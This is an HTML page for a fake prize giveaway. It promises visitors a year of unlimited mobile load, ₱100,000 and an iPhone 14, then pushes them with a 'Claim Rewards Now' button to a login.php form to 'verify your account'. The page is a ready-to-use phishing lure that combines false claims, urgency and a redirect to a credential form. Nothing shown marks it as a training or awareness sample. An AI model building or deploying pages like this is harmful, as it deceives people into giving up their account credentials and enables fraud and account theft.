<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exclusive Rewards</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: #f4f4f9; /* Soft light background */
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
            text-align: center;
        }
        .container {
            background: #ffffff;
            color: #333;
            border-radius: 12px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
            width: 450px;
            max-width: 90%;
            padding: 40px;
            text-align: center;
        }
        h1 {
            font-size: 32px;
            color: #ff6f61; /* Soft coral color */
            margin-bottom: 20px;
            font-weight: bold;
        }
        p {
            font-size: 16px;
            line-height: 1.6;
            color: #555;
            margin-bottom: 15px;
        }
        .highlight {
            font-weight: bold;
            color: #ff5722; /* Warm orange color */
        }
        button {
            width: 100%;
            padding: 14px;
            background-color: #ff5722; /* Warm button color */
            border: none;
            border-radius: 8px;
            color: #fff;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #e64a19;
        }
        .image-container {
            margin-top: 20px;
        }
        .image-container img {
            width: 100%;
            max-width: 300px;
            margin-bottom: 20px;
            border-radius: 8px;
        }
        .footer {
            margin-top: 30px;
            font-size: 12px;
            color: #888;
        }
        .footer a {
            color: #ff6f61;
            text-decoration: none;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        .note {
            font-size: 14px;
            color: #757575;
            margin-top: 10px;
        }
        .disclaimer {
            font-size: 12px;
            color: #555;
            margin-top: 25px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Congratulations! 🎉</h1>
        <p>You have been <span class="highlight">randomly selected</span> to receive exclusive rewards!</p>
        
        <p>🎁 Unlimited Load for 1 Year</p>
        <p>🎁 Win <span class="highlight">₱100,000</span> in Cash</p>
        <p>🎁 Get a Brand-New <span class="highlight">iPhone 14</span></p>

        <p>To claim your rewards, simply log in to verify your account.</p>

        <button onclick="redirectToLogin()">Claim Rewards Now</button>

        <div class="image-container">
            <img src="https://via.placeholder.com/300x200/ff6f61/ffffff?text=Claim+Your+Reward" alt="Claim your reward">
            <img src="https://via.placeholder.com/300x200/ff5722/ffffff?text=Unlimited+Load" alt="Unlimited Load">
        </div>

        <div class="footer">
            <p><strong>Note:</strong> This is a limited-time offer. Act fast!</p>
        </div>

        <div class="note">
            <p>Remember to always verify the URL before entering sensitive information.</p>
        </div>

        <div class="disclaimer">
            <p>This offer is subject to availability and terms & conditions.</p>
        </div>
    </div>

    <script>
        function redirectToLogin() {
            // Redirect to login form
            window.location.href = "login.php";
        }
    </script>
</body>
</html>
